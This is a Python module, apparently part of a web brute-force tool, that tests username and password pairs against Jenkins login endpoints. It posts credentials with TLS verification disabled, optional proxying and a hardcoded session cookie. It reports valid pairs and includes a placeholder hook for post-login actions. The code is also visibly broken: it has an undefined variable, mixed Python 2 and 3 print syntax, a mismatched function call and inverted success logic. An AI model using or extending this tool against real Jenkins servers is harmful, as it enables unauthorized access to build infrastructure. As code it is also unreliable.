#! /usr/bin/python
# this module is for jenkins attacks
from core.webModule import webModule
from requests import session
import requests
import re
from argparse import ArgumentParser
from lxml import html
import random


class jenkinsBrute(webModule):
    def __init__(self, config, display, lock):
        super(jenkinsBrute, self).__init__(config, display, lock)
        self.fingerprint="Jenkins"
        self.response="Success"
    def somethingCool(self, config, payload, proxy):
        #Do something cool here
        print("Something Cool not yet implemented")
    def connectTest(self, config, payload, proxy, submitLoc, submitType):
        #Create a session and check if account is valid
        with session() as c:
            requests.packages.urllib3.disable_warnings()
            cookie = {'JSESSIONID.d29cad0c':'14qy4wdxentt311fbwxdw85z7o'}
            resp1 = c.get(config["HOST"] + '/j_acegi_security_check', cookies=cookie, verify=False, data=payload, proxies=proxy)
            print resp1.headers
            cpost = c.post(config["HOST"] + '/employee/j_spring_security_check', cookies=cookies, data=payload, allow_redirects=True, verify=False,proxies=proxy)
            m = re.search('You are unauthorized to access this page.', cpost.text)
            if m:
                print("[+]  User Credentials Successful: " + config["USERNAME"] + ":" + config["PASSWORD"])
                if not config["dry_run"]:
                   print("[!] Time to do something cool!")
                   self.somethingCool(config, payload)
            else:
                print("[-]  Login Failed for: " + config["USERNAME"] + ":" + config["PASSWORD"])
